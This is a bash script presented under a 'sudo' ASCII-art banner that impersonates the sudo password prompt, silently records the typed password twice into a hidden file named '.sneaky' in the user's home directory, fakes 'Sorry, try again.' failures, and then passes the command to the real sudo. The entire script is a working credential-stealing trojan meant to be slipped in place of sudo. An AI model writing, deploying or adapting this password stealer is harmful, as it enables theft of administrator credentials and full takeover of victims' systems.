#!/bin/bash

####################################
#          ______________          #
#        .-              -.        #
#       /                  \       #
#      (____________________)      #
#    __|____________________|__    #
#   (__________________________)   #
#      |    __        __    |      #
#      |  .'  -      -  '.  |      #
#     _|      _'.  .'_      |_     #
#    / |    <(o)>  <(o)>    | \    #
#    ( |        |  |        | )    #
#     \|       (    )       |/     #
#      (        \__/        )      #
#       \  .   __  __   .  /       #
#        \  ';'''##''';'  /        #
#         \   '......'   /         #
#          \            /          #
#           \__________/           #
#     ___  _   _  _ __    ___      #
#    / __|| | | || '_ \  / _ \     #
#    \__ \| |_| || | | || (_) |    #
#    |___/ \__,_||_| |_| \___/     #
#                                  #
####################################

if [[ $(id -u) -eq 0 || -z $(sudo -nv 2>&1) ]]; then
	sudo "$@"; exit
fi

declare -r  logpath="/home/$USER/.local/share/.sneaky"
declare -ir failed_attempts=2
declare -ir delay=2
declare     prompt_message="[sudo] password for $USER: "
declare -i  steal=0

mkdir $(dirname $logpath) &>/dev/null
touch $logpath &>/dev/null

for ((i=1; i<=$#; i++))
do
	arg=${!i}
	
	case $arg in
		--verify|--edit|--list)
			steal=1; continue ;;
	esac

	if [[ $arg == "--prompt" ]]
	then
		value=$(echo $opt|grep -E "(?<=\=S).*")
		if [[ -n $value ]]; then
			prompt_message=$value
		else
			j=$((i+1))
			prompt_message=${!j}
		fi
	elif [[ $arg =~ ^-p ]]
	then
		if [[ ${#arg} -eq 2 ]]; then
			echo
		fi
	elif [[ $arg =~ ^([^-].*|-[vel])$ ]]; then
		steal=1
	fi
done

if [[ $steal -eq 1 ]]
then
	for ((i=0; i < $failed_attempts; i++))
	do
		read -s -p "$prompt_message" input 2>&1
		echo -en "\n"
		echo "$input">>$logpath
		sleep $delay
		echo "Sorry, try again."
	done
fi

sudo "$@"